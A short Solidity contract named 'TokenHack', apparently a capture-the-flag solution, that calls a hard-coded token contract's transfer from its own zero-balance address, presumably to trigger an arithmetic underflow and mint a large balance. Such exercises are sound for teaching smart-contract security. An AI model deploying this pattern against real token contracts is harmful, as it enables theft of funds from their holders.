// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Token{
   function transfer(address _to, uint _value) external returns (bool);
   function balanceOf(address account) external view returns (uint256);
}

contract TokenHack {
      uint public balance;
      
      Token public immutable originalContract = Token(0x815C264ADDA280B47C80aDaDf12e8199439f2e8F);

      function transferHack(address _to, uint _value) public returns (bool){
        
             bool res = originalContract.transfer(_to,_value);
             return res;
             
      }

      function checkBalance() public{
        balance=originalContract.balanceOf(msg.sender);
      }
}